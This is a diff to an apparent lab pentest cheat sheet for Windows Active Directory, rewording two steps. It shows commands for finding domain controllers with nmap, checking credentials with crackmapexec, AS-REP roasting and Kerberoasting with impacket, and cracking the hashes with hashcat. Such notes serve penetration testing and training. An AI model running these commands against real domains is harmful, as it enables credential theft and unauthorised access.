@@ -9,7 +9,7 @@
 2. If you're in DC network, Command: `nmap -r -v --open -sC -sV -p53,88,389,636 <DC IP>`
 3. If above command shows these ports **OPEN** ... You got **DC** !!!
 
-### How to know extract the underlying Windows OS via crackmapexec?
+### How to extract the underlying Windows OS via crackmapexec?
 1. Command: `proxychains crackmapexec smb -d somedomain.htb -u user -p 'password' -dc-ip 192.168.110.52-55`
 
 ### How to know that username/password combination is valid ?
@@ -29,5 +29,5 @@
 6. Crack the hashes, by running command: `hashcat -a 0 -m 18200 asrep-roast-hash.txt rockyou.txt`
 
 #### Using impacket - Kerberoasting?
-1. Command: `proxychains GetUserSPNs.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -request`
+1. To get hashes, run command: `proxychains GetUserSPNs.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -request`
 2. Cracking hashes: `hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt`
